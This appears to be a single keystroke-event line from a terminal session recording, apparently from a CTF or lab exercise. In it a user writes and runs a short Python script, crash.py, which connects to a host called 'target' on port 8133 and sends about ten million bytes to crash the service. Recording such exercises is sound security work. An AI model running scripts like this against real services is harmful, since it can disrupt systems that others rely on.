[247.708351, "i", "cat << 'EOF' > crash.py\nimport socket\ns = socket.socket()\ns.connect((\"target\", 8133))\ns.recv(1024)\ns.sendall(b\"00\"*5*1000000 + b\"\\n\")\nresp = b\"\"\nwhile True:\n    try:\n        chunk = s.recv(1024)\n        if not chunk: break\n        resp += chunk\n    except Exception as e:\n        print(e)\n        break\nprint(resp.decode('utf-8', 'ignore'))\ns.close()\nEOF\npython3 crash.py\n"]
